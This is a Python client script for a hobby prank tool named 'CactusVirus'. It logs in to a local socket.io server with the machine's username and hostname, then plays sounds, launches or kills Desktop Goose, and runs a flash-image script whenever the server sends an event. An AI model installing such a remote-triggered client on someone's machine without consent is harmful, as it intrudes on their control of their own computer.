import os
import socket
import getpass
import winsound
import socketio

io = socketio.Client()
username = getpass.getuser() + "@" + socket.gethostname()

soundbox_path = r"C:\Users\quent\Desktop\Perso\CactusVirus\Client\assets\Soundbox\\"
goose_path = r"C:\Users\quent\Desktop\Perso\CactusVirus\Client\assets\Goose\\"
flash_path = r"C:\Users\quent\Desktop\Perso\CactusVirus\Client\assets\FlashCoucou\\"
soundlist = ["nopal-earrape", "passe-partout", "rene-ballek", "tabarnak", "wii-sport", "pauvre-conne", "patrick-ftg", "losing-horn", "titanic"]
flash_coucou = ["flash-jfp", "flash-blanquer", "flash-michel"]

@io.on("event-launched")
def event_triggered(event):

    print(event)

    if event in soundlist:
        winsound.PlaySound(soundbox_path + event + ".wav", winsound.SND_ASYNC)
    
    elif event == "stop":
        winsound.PlaySound(None, winsound.SND_PURGE)

    elif event == "spawn":
        os.system(goose_path + "GooseDesktop.exe")

    elif event == "kill":
        os.system("taskkill/f /im goosedesktop.exe")

    elif event in flash_coucou:
        os.system(f"python {flash_path}\FlashCoucou.pyw {flash_path} {event}")

io.connect("http://localhost:3000")
io.emit("login", username)
